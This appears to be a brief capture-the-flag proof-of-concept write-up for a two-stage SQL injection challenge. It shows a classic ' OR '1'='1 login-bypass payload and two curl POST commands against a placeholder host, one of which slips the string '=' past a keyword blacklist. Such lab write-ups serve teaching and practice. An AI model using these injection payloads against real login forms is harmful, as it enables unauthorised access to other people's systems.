# Proof of Concept

## TL;DR

- The challenge consists of **two stages**:
  1. **The Door Lock (Login Page)** → vulnerable to basic SQL Injection.  
  2. **The Vault (Flag Page)** → also SQL Injection, but with a **blacklist filter** that blocks some obvious keywords.  
- The flag is stored in the `vault` table inside the database.

## Steps

### 1. Bypass Login (The Door Lock)

We can inject into the username/password fields.  
A simple payload like `' OR '1'='1 --` works.

```bash
curl -s -X POST http://ip/index.php \
  -d "username=admin' OR '1'='1&password=anything"
```

### 1. Bypass Key (The Vault Lock)

```bash
curl -s -X POST http://ip/vault.php \
  -d "code='='"
```
